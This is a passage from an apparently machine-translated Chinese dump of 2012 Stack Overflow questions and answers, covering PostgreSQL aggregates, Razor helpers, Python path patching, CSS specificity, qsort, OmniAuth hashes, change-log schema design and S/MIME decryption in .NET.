|     1   |      tp3      |  1  |   1    | {p1}             |   4  | 
```

等等

有没有一种方法可以有效地使用窗口函数？

如果我想按周分组怎么办？（即代表周数的另一列）

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T01:32:47.503

标准的 GROUP BY 查询将为您提供大部分帮助：

```
SELECT
    user_id,
    type_of_place,
    avg(money_earned) AS avg,
    stddev(money_earned) AS stddev
FROM
    earnings  -- I'm not sure what your data table is called...
GROUP BY
    user_id,
    type_of_place 
```

这留下了`top5_places`和`mode`列。这些也是聚合，但不是标准 PostgreSQL 安装中定义的聚合。幸运的是，您可以添加它们。

这是一个讨论如何定义`mode`聚合函数的页面： [http ://wiki.postgresql.org/wiki/Aggregate_Mode](http://wiki.postgresql.org/wiki/Aggregate_Mode)

一旦你有了一个`mode`聚合函数，假设`time`是某种时间戳，你将添加到选择列表中的表达式将是：

```
SELECT
    ...
    mode(extract(hour FROM time)) AS mode  -- Add this expression
FROM
    ... 
```

**假设按钱订购**

对于`top5_places`，有几种方法，但最快的可能是使用 PostgreSQL 的内置`array_agg`函数，并取前 5 个元素：

```
SELECT
    ...
    (array_agg(place ORDER BY money_earned DESC))[1:5] AS top5_places  -- Add this expression
FROM
    ... 
```

一种替代方法是定义另一个名为 (for instance) 的聚合`top5`，它执行相同的功能。如果每个用户/地点类型的组合有许多不同的地点，这可能会更有效，因为它可以在前 5 个之后停止累积，而上面的表达式通常会构建所有地点的完整数组，然后截断到第一个5.

*这假设一个地方对于每个用户/类型组合都有一个唯一的收入条目。* 如果一个地方可以出现多次，并且您想`sum(money_earned)`为每个地方排序，那么您需要使用如下示例中的子查询...

**按数量排序**

好的，所以这些地方应该按照它们出现的频率来排序。这是一种使用几个子查询的快速方法——将其作为表达式添加到上述查询的选择子句中：

```
(SELECT
    (array_agg(place ORDER BY cnt DESC))[1:5]
FROM
    (SELECT place, count(*) FROM earnings AS t2
     WHERE t2.user_id = earnings.user_id AND t2.type_of_place = earnings.type_of_place
     GROUP BY place) AS s (place, cnt)
) AS top5_places 
```

调用的内部子查询`s`为每个用户/类型组合计算一个表`place`，以及它出现的次数（我称之为`cnt`）。`array_agg`然后按该计数的降序将这些输入。

我怀疑可能会有更简洁（并且可能更有效）的编写方式。如果没有，那么我建议您尝试将这个复杂的表达式移动到函数或聚合中，如果可以的话......

**每小时地点的直方图**

我们将使用类似的表达式，它将返回按小时排序的计数数组：

```
(SELECT
    array_agg(cnt ORDER BY hour DESC)
FROM
    (SELECT extract(hour FROM time), count(*) FROM earnings AS t2
     WHERE t2.user_id = earnings.user_id AND t2.type_of_place = earnings.type_of_place
     GROUP BY 1) AS s (hour, cnt)
) AS hourly_histogram 
```

（将其添加到原始查询的选择子句中。）

# asp.net-mvc - 如何在 mvc 中创建 html 助手

> ID：13353898
> 
> 赞同：0
> 
> 时间：2012-11-13T00:27:30.967
> 
> 标签：asp.net-mvc, razor, html-helper

我目前使用的代码是这样的：

```
@Html.LabelFor(model => model.MaxExecutions)
<div class="input-append">
    @Html.TextBoxFor(model => model.MaxExecutions, new { @class = "input-xxlarge", placeholder="Enter Max Executions" })
    <span class="add-on"><a href='#' class='title' rel='tooltip' title="Help Title" data-content="Help Message">?</a></span>
    @Html.ValidationMessageFor(model => model.MaxExecutions)
</div> 
```

我在我的代码中一遍又一遍地重复这一点。我很乐意将此传递给 HtmlHelper。我传入的模型类型可以更改，并且我希望模型中的 Display 属性可用（或者我只生成一个 htmlstring）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T02:59:07.703

您可以实现扩展方法或帮助程序（静态）类，但有时我喜欢声明式版本 (CSHTML)。无论哪种方式都可以，并且可以从控制器等传递。

~/App_Code/Blah.cshtml

```
@helper ExecuteHelper() {
   @Html.LabelFor(model => model.MaxExecutions)
   <div class="input-append">
       @Html.TextBoxFor(model => model.MaxExecutions, new { @class = "input-xxlarge",    placeholder="Enter Max Executions" })
    <span class="add-on"><a href='#' class='title' rel='tooltip' title="Help Title" data-content="Help Message">?</a></span>
   @Html.ValidationMessageFor(model => model.MaxExecutions)
   </div>
} 
```

然后在视图中调用它：

```
@Blah.ExecuteHelper() 
```

我注意到您拥有的 HTML 数量，这就是我选择 @helper 语法解决方案的原因。这是 Scott Guthrie 的一篇文章，概述了这个 MVC 功能： [文章](http://weblogs.asp.net/scottgu/archive/2011/05/12/asp-net-mvc-3-and-the-helper-syntax-within-razor.aspx)

# python - 自动修补 PYTHONPATH（使用 Fabric 任务时）

> ID：13353899
> 
> 赞同：2
> 
> 时间：2012-11-13T00:27:33.947
> 
> 标签：python

我将函数调用包装在我的初始化模块中，并使用修补 PYTHONPATH 以将当前目录添加到其中的装饰器，这样我就可以在我的模块中使用相对导入，而不必担心将包显式添加到 PYTHONPATH（根据@abarnert 的评论进行编辑）

```
def patch_python_path(f):
    @wraps(f)       
    def wrap(*args, **kwargs):
        ROOT = os.pathsep.join([os.path.abspath(os.path.dirname(__file__))])
        if not os.environ.has_key("PYTHONPATH"):
            os.environ["PYTHONPATH"] = ""
        if not (ROOT in os.environ["PYTHONPATH"].split(":")):
            os.environ["PYTHONPATH"] = "%s:%s" % (os.environ["PYTHONPATH"], ROOT)
        if not ROOT in sys.path:
            sys.path.append(ROOT)
        return f(*args, **kwargs)
    return wrap 
```

这是我如何使用它：

```
@patch_python_path
def initialize():
    #at this point any code being run has access to local modules through relative imports
    pass 
```

这种方法是否存在我不知道的重大问题？

* * *

我的目标如下：

*   我想要一个用户可以立即使用的自包含引导程序，而无需任何额外的环境操作
*   我还假设用户可以更改引导程序包的名称，因此所有导入都必须保持相对

[编辑] 我实际上意识到我面临的问题更多地与 Fabric 运行任务的方式有关，而不是纯 Python 模块导入。如果我尝试从 python shell（而不是 fab task1）运行任务，则所有导入都可以正确解析，而无需任何修补。通过 fab 运行任务会导致导入错误

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T01:22:35.653

1.  `os.environ`是全球性的。您正在修改它，而不是在之后修改它。因此，在`@patch_python_path`完成任何函数之后，您现在已经为之后定义的所有其他内容完成了等价的操作——包括在其他模块和顶级脚本中。
2.  `sys.path`也是全局的，你再次修改它而不是恢复它。
3.  您永远不需要同时修改`PYTHONPATH`和`sys.path`。（尤其是你通常不需要的前者。）
4.  您要添加`.`到`PYTHONPATH`，但要添加`os.getcwd()`到`sys.path`。如果您*确实*需要同时修改两者，那么一切都将在 之后停止工作`os.chdir()`，这将有效地改变`PYTHONPATH`而不是`sys.path`.
5.  任何包装的函数都将丢失其文档字符串、名称等；`@functools.wraps`在您的`wrap`功能上使用。

这些都只是你实施的问题，而不是首先考虑这是否是一个好主意。

人们想要这样的最常见原因是 (a) 使 Python XY 包像 Python VW 一样工作，以及 (b) 允许从源代码树导入包与在安装后导入包一样工作，即使从解释器 shell 中也是如此。前者可能是个坏主意；后者很方便，但还有其他方法可以完成它。如果您有一些不同的更高级别的目标，您必须先告诉我们该目标是什么，然后其他人才能告诉您这是否是实现目标的最佳方式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T01:18:19.223

您可以简单地将当前路径添加到`sys.path`：

```
import sys
def patch_python_path(f):
    def wrap(*args, **kwargs):
        if not '.' in sys.path:
            sys.path.append('.')
        return f(*args, **kwargs)

    return wrap 
```

# html - CSS 应用顺序

> ID：13353900
> 
> 赞同：4
> 
> 时间：2012-11-13T00:27:47.357
> 
> 标签：html, css, styles

我有这个 CSS

```
.menuPopup div {
    width: 100%;        
    padding: 5px;
}

.menuClose {
    width:10px; 
    height:10px; 
    padding:0px; 
    position:absolute; 
    top:0px; 
    right:0px; 
    cursor:pointer;
} 
```

这应该适用于这个 HTML：

```
<div class="menuPopup">
    <div >A</div>
    <div >B</div>
    <div >C</div>
    <div class="menuClose">X</div>
</div> 
```

应用时，`.menuPopup div`声明总是覆盖`.menuClose`.

如何更改订单？IE。使“X”的宽度`10px`而不是`100%`？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-13T00:31:50.140

这是因为您在顶部声明中有更多选择器。

如果你这样做，它应该覆盖：

```
.menuPopup div.menuClose {
    width:10px; 
    height:10px; 
    padding:0px; 
    position:absolute; 
    top:0px; 
    right:0px; 
    cursor:pointer;
} 
```

有关如何处理 css 级联优先级的说明，请参阅本文：http: [//eriestuff.blogspot.com/2007/11/css-cascade-what-defenition-takes.html](http://eriestuff.blogspot.com/2007/11/css-cascade-what-defenition-takes.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T00:32:32.680

您可以尝试使用`!important`您要强制执行的规则。例如：

```
.menuClose {
width:10px !important; 
height:10px !important; 
etc...
} 
```

# android - 更改自定义对话框中存在的按钮文本和操作

> ID：13353901
> 
> 赞同：0
> 
> 时间：2012-11-13T00:27:51.507
> 
> 标签：android, android-button, android-dialog

我有一个自定义对话框，其中包含一些文本和一个“下一步”按钮。现在，如果我的应用程序完成并结束，则会出现相同的自定义对话框，但我需要使用“关闭”更改按钮文本以及相应的操作。这是代码：

```
 private void CustomizedDialog(String text1, String text2) {
final Dialog customDialog = new Dialog(this);
customDialog.getWindow();
customDialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
customDialog.setContentView(R.layout.custom_dialog);

TextView firstTextView = (TextView)customDialog.findViewById(R.id.textView1);
firstTextView.setText(text1);

TextView secondTextView = (TextView) customDialog.findViewById(R.id.textView2);
secondTextView.setText(text2);
    if (currentInfo == (information.size() - 1)) {
    View closeButton = customDialog.findViewById(R.id.answer_next_button);
        closeButton.setOnClickListener(new OnClickListener() {
        public void onClick(View v) {
            customDialog.dismiss();
        }
    });

    } else {
        View nextButton = customDialog.findViewById(R.id.answer_next_button);   

        nextButton.setOnClickListener(new OnClickListener() {

            public void onClick(View v) {
                Log.d("next button", "next button clicked");
                customDialog.dismiss();
                if (currentInfo < (information.size() - 1)) {
                    currentInfo++;
                    nextInformation();
                }
            }
        });
    }

    customDialog.show();
} 
```

当应用程序结束时，如何使用关闭按钮及其操作更改自定义对话框中的下一个按钮及其相关操作？任何帮助将非常感激。谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:37:00.083

假设您的条件是好的，如果它是最后一个条目，您应该访问第一个条件，以更改您只需将文本转换`View`为 a`Button`并调用`.setText(String t)`方法：

```
Button closeButton = (Button)customDialog.findViewById(R.id.answer_next_button);
       closeButton.setText("Close"); 
```

至于*关联的动作*，这一切似乎都是正确的，只需`onClick`在第一个条件的方法中添加任何其他动作。

# c - qsort 使用什么排序算法？

> ID：13353904
> 
> 赞同：8
> 
> 时间：2012-11-13T00:28:14.267
> 
> 标签：c, sorting

我找不到任何关于 C`qsort`函数使用什么排序算法的信息。

是快速排序吗？在人中没有提到。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-13T00:31:06.430

`qsort`未指定的实现：实现可以使用任何排序算法。有趣的是，排序不需要稳定，也没有复杂度要求。

(C11 §7.22.5.2)的整个规范`qsort`如下：

> **`qsort`功能_**
> 
> **概要**
> 
> ```
> #include <stdlib.h>
> void qsort(void *base, size_t nmemb, size_t size,
>      int (*compar)(const void *, const void *)); 
> ```
> 
> **描述**
> 
> 该`qsort`函数对对象数组进行排序`nmemb`，其初始元素由 指向`base`。每个对象的大小由 指定`size`。
> 
> 数组的内容根据 compar 指向的比较函数按升序排序，该函数使用两个指向被比较对象的参数调用。如果认为第一个参数分别小于、等于或大于第二个参数，则该函数应返回一个小于、等于或大于零的整数。
> 
> 如果两个元素比较相等，则它们在结果排序数组中的顺序是未指定的。
> 
> **退货**
> 
> 该`qsort`函数不返回任何值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T00:35:04.600

理论上，qsort 只定义到 and 的返回值和调用值的`qsort`地步`bsort`。[以下](http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1256.pdf)是 ISO 标准参考。

在实践中，它通常使用[快速排序](http://en.wikipedia.org/wiki/Quicksort)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T09:59:04.620

作为对 James McNellis 对该标准的引用的补充，值得注意的是[GNU 的 libc 文档](http://www.gnu.org/software/libc/manual/html_node/Array-Sort-Function.html "数组排序函数")说

> 该`qsort`函数的名称源于它最初是使用“快速排序”算法实现的。

并且它决定使用[另一种算法](http://sourceware.org/git/?p=glibc.git;a=blob;f=stdlib/msort.c;h=e419734cd634ba5c53c2d6104d8ffb5828b979eb;hb=3bae7c5d987f84cc57b56e1a65e04fbbacdc17ed "[glibc.git]/stdlib/msort.c")，显然是合并排序。

# actionscript-3 - 如何以编程方式将库中的电影剪辑添加到舞台？

> ID：13353908
> 
> 赞同：7
> 
> 时间：2012-11-13T00:28:48.320
> 
> 标签：actionscript-3, flash

我想知道如何以编程方式将库中的 MovieClip 添加到舞台上。

我该怎么做呢？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-13T04:51:12.363

Flash 中的符号可以定义*ActionScript Linkage*。

可以通过右键单击库中的符号并选择*属性来设置 AS 链接...*

![符号属性](../Images/ca8f64a514bd18c3d93965f2a7e25f19.png)

选中*Export for ActionScript*并输入一个类名。

如果不需要显式定义超出符号类型的基类，可以直接从库中进入 AS Linkage：

![图书馆](../Images/e88860d46134982979a37645de82464c.png)

这将创建一个与您编写 ActionScript 类没有什么不同的类定义。

通过实例化您的 AS Linkage 类型的新实例来创建实例：

```
var symbolExample:SymbolExample = new SymbolExample();
addChild(symbolExample); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-13T03:36:52.323

您实际上将为您的电影剪辑创建一个“类”。按照 James 上面的建议做......但是当你把它调用到你的程序中时，你将不得不执行这样的事情：

```
//instantiate your object
var movieClip:MovieClip = new MovieClip;

//add it to the stage
addChild(movieClip);

//object will default to x=0 , y=0 so you can define that as well
movieClip.x=100;
movieClip.y=100;

//and so on... 
```

`movieClip`是你想要的任何东西......但是`MovieClip`是你在属性对话框中分配的类的名称。这些 var/class 关系通常区分大小写，因此对于您在库中创建的任何内容，请遵循此公式。

调用和删除对象的方法有很多种，根据您打算对对象执行的操作，它可能会变得更简单或更复杂。例如，您可以告诉对象要占用哪个层：

```
addChildAt(movieClip, 1); 
```

这将添加`movieClip`到第 1 层或最底层之上的层。

希望这可以帮助...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T01:30:58.717

您可以通过任何您想要的方法创建您的movieclip，然后当它在库中时，您右键单击并选择Properties，选中Export for Actionscript 框，选择一个类名并在第1 帧中导出。然后，无论何时要添加它，您都可以添加就像对待任何其他对象一样。我相信其他人会在我之后有更详细的解释，这是一般的想法。

# mysql - 使用以前的 1.5.1 SQL 导出安装 Magento 1.5.1 会产生 PDOException 23000

> ID：13353911
> 
> 赞同：0
> 
> 时间：2012-11-13T00:29:07.260
> 
> 标签：mysql, sql, magento, installation, magento-1.5

正如标题所说，我以前安装了 1.5.1 的 Magento。我正在移动它。我进行了导出并将其导入到另一台服务器上的数据库中。我重新上传了一个magento 1.5.1。我正在尝试运行安装并将其指向新的数据库，但我不断收到此错误。下面是在重定向到 magento 错误页面之前发生的错误的屏幕截图。我不是后端程序员，而且我很少有 Magento 经验，所以任何帮助都会是有益的。

![在此处输入图像描述](../Images/3368a95b7fe380524e126fa9217c3fc5.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T14:28:18.210

我认为在更改数据库时，magento 尝试将数据库升级到 1.5.1 并添加了一个约束，但是您的旧数据在 sales_flat_order 表中具有重复的增量 ID，这就是您收到此错误的原因。

这个问题在这里讨论[http://www.magentocommerce.com/boards/viewthread/221281/](http://www.magentocommerce.com/boards/viewthread/221281/)

谢谢

# javascript - 自动增加标签大小

> ID：13353913
> 
> 赞同：0
> 
> 时间：2012-11-13T00:29:10.013
> 
> 标签：javascript, jquery, css, google-visualization

我需要在[https://developers.google.com/chart/interactive/docs/gallery/barchart的垂直轴上显示标签的全文](https://developers.google.com/chart/interactive/docs/gallery/barchart)

但是文本是可变的，所以我不知道我需要多少空间。

我所做的是增加图表的宽度和高度，但这并不总是必要的。

有什么方法可以设置图表，使其自动更改文本的大小？

![示例图片](../Images/3a436338edb58ecbdeaf490f9a5c4e7a.png)

编辑 [https://developers.google.com/chart/interactive/docs/gallery/barchart](https://developers.google.com/chart/interactive/docs/gallery/barchart)

非常感谢！

# javascript - jQuery 将表单序列化为 JSON 对象但忽略占位符

> ID：13353919
> 
> 赞同：1
> 
> 时间：2012-11-13T00:30:03.857
> 
> 标签：javascript, jquery, forms, serialization

好的 不久前，我发现了一个很棒的 jQuery 小插件样式脚本，它将获取表单中的所有字段并将它们序列化为 JSON 对象。然而不幸的是。我发现如果没有另外提供，这个函数将使用占位符文本。如果占位符文本是那里的文本，我宁愿将其设置为空。

有什么想法可以将其添加到这个小片段中吗？

```
(function($) {
$.fn.serializeFormJSON = function() {

   var o = {};
   var a = this.serializeArray();
   $.each(a, function() {
       if (o[this.name]) {
           if (!o[this.name].push) {
               o[this.name] = [o[this.name]];
           }
           o[this.name].push(this.value || '');
       } else {
           o[this.name] = this.value || '';
       }
   });
   return o;
};
})(jQuery); 
```

编辑：换句话说，占位符属性可能类似于`placeholder="First name"`，并且似乎javascript在获取输入时将其视为实际值。因此，我将名字字段（可选）的条目设为“名字”。所以我想弄清楚如何比较上面的片段所在的当前字段，并让它看到该字段的当前占位符（如果有的话，比如 selects 没有那个属性）。如果要提取的值与占位符属性匹配，我想将该字段添加到正在创建的对象中，`null`而不是占位符文本

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:37:14.090

为什么不在序列化之前清除占位符？

```
function clearPlaceHolders(){
 var form = document.GetElementById("formId");
 $(form).find("input").each(function(index,el){
  el.removeAttribute("placeholder");
 }
} 
```

请参阅此示例：http: [//jsfiddle.net/WjEK9/](http://jsfiddle.net/WjEK9/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T00:35:51.197

您可以修改您的 DOCTYPE 以允许在输入标签上使用自定义属性（如果您关心标准）（或者只需将属性“data-xxx”称为“data-placeholderValue”，然后将占位符值添加为值和“ placeholderValue”（例如）然后你的 JS 可以检查是否`value == placeholderValue`然后忽略它。

一个例子：

**HTML：**

```
<input id="test" type="text" value="Please enter blah" placeholder="Please enter blah" /> 
```

**JS：**

```
var element=$('#test');
if(element.val == element.attr('placeholder')) {
  element.val(''); // Or however you want to express/capture this.
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T00:37:57.817

如果您指的是 HTML 中的占位符属性，我相当肯定占位符属性公开为 .placeholder 而不是 .value。

您是使用占位符属性还是使用脚本将占位符换入和换出值？

# java - 使泛型数组返回与其传递的参数类型相同的数组

> ID：13353930
> 
> 赞同：0
> 
> 时间：2012-11-13T00:31:47.580
> 
> 标签：java, generics

所以我想知道如何创建一个泛型方法，当传递给定类型的数组时，将返回相同类型的数组。我目前正在使用的代码如下所示：

```
public class InsertionSort<T extends Comparable<T>> extends Sort<T>
{
 public T[] sort (T[] data)
 {
  for (int index = 1; index < data.length; index++)
  {
     T key = data[index];
     int position = index;

     /* Shift larger values to the right */
     while (position > 0 && data[position-1].compareTo(key) > 0)
     {
        data[position] = data[position-1];
        position--;
     }

     data[position] = key;
  }

  return data;
 }
} 
```

问题：当我将一个 Integer[] 数组作为参数传递给此方法时，它会以基本 Comparable[] 或 Object[] 数组而不是 Integer[] 的形式返回数据。有没有办法改变它，如果它传递一个 Integer[] 数组，它会对其进行排序并返回一个 Integer[] 数组，但如果它传递一个 String[] 数组，它会对其进行排序并返回一个字符串 [] 的数组？（对于实现 Comparable 的任何其他类型，依此类推）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T02:23:27.773

从根本上说，Java 方法不能返回一种以上的类型。您可以返回泛型类型 Object，然后在调用函数中对其进行类型转换。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T21:14:22.520

使用起来可能有点尴尬，但你可以这样做：

```
public class MyClass {

    public <K extends Comparable<K>> K[] getMe(K[] obj) {
        return obj;
    }

    public static void main(String[] args) {
        MyClass c = new MyClass();

        Integer[] b = {1,2,3};

        Integer[] d = c.getMe(b);

        for(Integer i : d) {
            System.out.println(i);
        }
    }

} 
```

# ios5 - 在 ABAdressbook 上寻找指针和说明

> ID：13353934
> 
> 赞同：0
> 
> 时间：2012-11-13T00:32:02.510
> 
> 标签：ios5, abaddressbook

我正在尝试将 ABAdressbook 支持添加到我的 IOS5 应用程序中。一直在看文档。我得到这个代码，我们使用以下方法创建一个 ABAdressbook 实例：

```
ABAddressBook *addressBook;
ABPerson *newPerson;
addressBook = [ABAddressBook sharedAddressBook]; 
```

（这来自苹果文档。）

我相应地添加了标题和框架。但编译器 (xcode) 无法识别 ABAdressbook。这让我想知道这段代码是否只适用于 OSX API 而在 IOS 下无效？

到目前为止，我得到的工作代码总是通过创建一个 ABAddressBookRef 使用：

```
ABAddressBookRef addressBook = ABAddressBookCreate(); 
```

我还没有找到很多关于 IOS 地址簿编程的好文档，而且苹果文档在与小组合作时也很模糊。

所以我正在寻找一些帮助和一些好的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-07T11:47:25.017

创建 ABAddressBook 像这样的 ABAddressBookCreate() 不再存在。

```
ABAddressBookRef addressBook =ABAddressBookCreateWithOptions(NULL,NULL); 
```

# ruby-on-rails - Rails：使用 OmniAuth（FB 授权），从 Facebook Hash 读取数据

> ID：13353941
> 
> 赞同：0
> 
> 时间：2012-11-13T00:32:55.040
> 
> 标签：ruby-on-rails, hash, authorization, omniauth

**使用 OmniAuth，我成功地从 Facebook 获取哈希数据：存储在“auth”中**

```
# extra=#] last_name="Jordan" link="http://www.facebook.com/michael" locale="en_US" middle_name="Ball" name="Michael Jordan" quotes="\"lalala\"\n\n\"lala\"" timezone=9 updated_time="2011-09-01T20:25:58+0000" username="mjordan82" verified=true>> info=# verified=true> provider="facebook" uid="123456879"> 
```

**在用户模型中，我执行以下操作：**

```
def self.create_with_omniauth(auth)
  create! do |user|
    user.provider = auth["provider"]
    user.uid = auth["uid"]
    user.name = auth["name"]
  end
end 
```

当我检查数据库时，我只有提供者和 uid。User.name 行为空。通过测试，我发现除了提供者和 uid 之外，我无法存储其他数据。例如，user.name = auth["provider"] 或 user.name = auth["uid"] 存储没有问题，但是当我尝试类似 user.name = auth["timezone"] 或 user.name = auth["last_name"]，变量中没有存储任何内容。有人知道怎么修这个东西吗？我也试过 user.name = auth["user_info"]["name"]，但它返回了一个错误。

**我不确定为什么 user.name = auth["name"] 不存储任何内容。换句话说，为什么在这种情况下 auth["name"] 不是 "Michael Jordan"？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T06:51:27.193

关键是：*我以错误的方式访问身份验证哈希。*答案是你做

```
user.name = auth["info"]["name"] 
```

以下是有关 Auth Hash 的详细信息：

```
:provider => 'facebook',
:uid => '1234567',

:info => {
 :nickname => 'jbloggs',
 :email => 'joe@bloggs.com',
 :name => 'Joe Bloggs',
 :first_name => 'Joe',
 :last_name => 'Bloggs',
 :image => 'http://graph.facebook.com/1234567/picture?type=square',
 :urls => { :Facebook => 'http://www.facebook.com/jbloggs' },
 :location => 'Palo Alto, California',
 :verified => true
},
:credentials => {
 :token => 'ABCDEF...', # OAuth 2.0 access_token, which you may wish to store
 :expires_at => 1321747205, # when the access token expires (it always will)
 :expires => true # this will always be true
},
:extra => {
  :raw_info => {
  :id => '1234567',
  :name => 'Joe Bloggs',
  :first_name => 'Joe',
  :last_name => 'Bloggs',
  :link => 'http://www.facebook.com/jbloggs',
  :username => 'jbloggs',
  :location => { :id => '123456789', :name => 'Palo Alto, California' },
  :gender => 'male',
  :email => 'joe@bloggs.com',
  :timezone => -8,
  :locale => 'en_US',
  :verified => true,
  :updated_time => '2011-11-11T06:21:03+0000'
} 
```

来源：[https ://github.com/mkdynamic/omniauth-facebook](https://github.com/mkdynamic/omniauth-facebook)

这就是为什么我可以使用简单的 auth [“provider”] 访问“provider”和“uid”，而我需要这样做

```
auth["info"]["name"] 
```

访问名称信息。

同样，要获取用户的时区，您可以这样做

```
auth["extra"]["timezone"] 
```

# database - 您将如何对表建模以记录其他表记录值的更改？

> ID：13353946
> 
> 赞同：0
> 
> 时间：2012-11-13T00:33:40.167
> 
> 标签：database, postgresql, database-design, activerecord, schema

我正在编写一个模型来记录对其他模型所做的更改，以便记录每个属性更改。我正在寻找有关如何最好地构建更改记录表的输入。

例如，我有一个`User`带有`name`属性的模型。`Change`当该用户的名称从更改为时，我想将记录保存到数据库`Bob`中`Ted`。

此外，如果用户`User`同时更新多个属性，我想将这些属性记录为单个`Change`. 例如， a`User`分别将`name`和`email`属性从`Bob`和更改`bob@bobsdomain.com`为`Ted`和`ted@teddy.com`。

正在更改的给定对象的属性集是任意的。您将如何构建表格？

目前，我正在做类似以下的事情（简化）：

```
Changes:
  user_id:integer
  changed_fields:string
  old_values:text
  new_values:text 
```

在上述示例中，这些记录如下所示：

```
:changed_fields => "name", 
:old_values => "Bob", 
:new_values => "Ted" 
```

和

```
:changed_fields => "name,email", 
:old_values => "Bob,bob@bobsdomain.com", 
:new_values => "Ted,ted@teddy.com" 
```

在`Change`模型上，我有特殊的 getter/setter 方法，可以解析输入/输出以映射到特定格式。

**有没有更好的方法来模拟这种事情？**

如果不是，考虑到值可以是任意的，那么格式化数据库值以使解析输入/输出效果最佳的最佳方法是什么。

我使用 Postgres 作为我的数据库，使用 ActiveRecord 作为 ORM。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T01:44:47.637

同时存储旧值和新值是多余的。您可以改为在更改时仅存储新值，并确保在创建新行时也添加更改记录。如果一行被修改了 N 次，那么它在修改表中就会有 N+1 条记录，如果需要可以追溯查找它们之间的差异。

事实上，一种方法是只有一张表包含所有版本的数据。通过插入新行进行编辑，而不是就地更新任何行。我在使用布尔“最新”字段或使用另一个表中的外键来引用每一行的当前版本时采用了这种方法。

这些天虽然我使用 django-reversion 包为我实现修订跟踪。它使用单个表来记录所有跟踪表的所有版本，存储每个版本中每个对象状态的 JSON 表示。它使用一个附加表来跟踪整个更改集，因此它可以对跨越多个对象的更改进行版本控制。

最适合您的解决方案将取决于您需要能够在您的表上有效地执行哪些操作，以及您的 ORM 使您可以轻松使用哪些操作。我希望这个答案有助于指出一些在其他环境中有效的方法。

# ios - PerformSelector 获取具有不同时间戳的 URL-iOS

> ID：13353950
> 
> 赞同：1
> 
> 时间：2012-11-13T00:33:48.107
> 
> 标签：ios, ios6, performselector

我正在使用 performSelector 每隔几秒使用不同的时间戳调用 URLRequest。但是，数据处理可能需要比我定义的时间更长的时间。

```
 [self performSelector:@selector(process) withObject:nil afterDelay:1.6]; 
```

下面的部分显示了该方法被调用

```
 -(void)process
{
    timestamp=[NSString stringWithFormat:@"%1.f",progressValue];
    NSString *contour=@"&bandschema=4";
    NSString *url6=[NSString stringWithFormat:@"http://contour.php?  callback=contourData%@&type=json&timestamp=%@%@",timestamp,timestamp,contour];        
    NSURL *url1=[NSURL URLWithString:url6];
  __weak ASIHTTPRequest *request1 = [ASIHTTPRequest requestWithURL:url1];
        [request1 setCompletionBlock:^{
            responseString = [request1 responseString];
                [self plotPoint:self.responseString];

        }];
        [request1 setFailedBlock:^{

            NSError *error=[request1 error];
            NSLog(@"Error: %@", error.localizedDescription);
        }];
        [request1 startAsynchronous];
    } 
```

这部分是分析数据的起点。

```
-(void)plotPoint:(NSString *)request
{
    NSArray *polygonArray = [[dict  objectForKey:@"data"]valueForKey:@"polygon"];
    NSArray *valleyPolygonArray = [[dict objectForKey:@"valley"]valueForKey:@"polygon"];
    CLLocationCoordinate2D *coords;
} 
```

然而，有时时间间隔不足以获取新数据，尤其是当互联网连接不好时。

你能指导我吗？我该如何处理这个问题？最佳解决方案是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:42:15.967

`process`收到如下回复后为什么不打电话，

```
-(void)process
{
    timestamp=[NSString stringWithFormat:@"%1.f",progressValue];
    NSString *contour=@"&bandschema=4";
    NSString *url6=[NSString stringWithFormat:@"http://contour.php?  callback=contourData%@&type=json&timestamp=%@%@",timestamp,timestamp,contour];        
    NSURL *url1=[NSURL URLWithString:url6];
  __weak ASIHTTPRequest *request1 = [ASIHTTPRequest requestWithURL:url1];
        [request1 setCompletionBlock:^{
            responseString = [request1 responseString];
            [self plotPoint:self.responseString];

            if (somecondition)//based on some condition to break the chain when needed
              [self process];    
        }];
        [request1 setFailedBlock:^{

            NSError *error=[request1 error];
            NSLog(@"Error: %@", error.localizedDescription);

            if (somecondition)//based on some condition to break the chain when needed
              [self process];        
        }];
        [request1 startAsynchronous];
    } 
```

这样，您可以在获得对创建新请求的响应后将 1.6 作为确切的时间间隔。

# .net - smime 邮件解密

> ID：13353961
> 
> 赞同：2
> 
> 时间：2012-11-13T00:35:14.980
> 
> 标签：.net, email, encryption, x509certificate, smime

我正在尝试使用证书和私钥解密签名和加密的电子邮件。这非常适用于加密的电子邮件。如果电子邮件经过签名和加密，则会在任何文件附件数据的开头和结尾添加额外字符。例如，多余的字符`?/?zHlTVqQAAMAAAAEAAAA//8AALgAAA...`在哪里。`?/?z`确切的字符将根据附件的类型和大小而有所不同。我可以查找并删除这些字符，但我需要知道所有可能的组合。

有谁知道删除这些字符的更简单方法？这是我用来解密电子邮件的代码，电子邮件`sInput`的原始加密字符串在哪里：

```
Dim EncryptCert As New X509Certificate2(sCERTIFICATE, sCERTIFICATE_PASS)

data = Convert.FromBase64String(sInput)

Dim envData As New EnvelopedCms(New ContentInfo(data))
Dim Recipient As New CmsRecipient(SubjectIdentifierType.IssuerAndSerialNumber, EncryptCert)
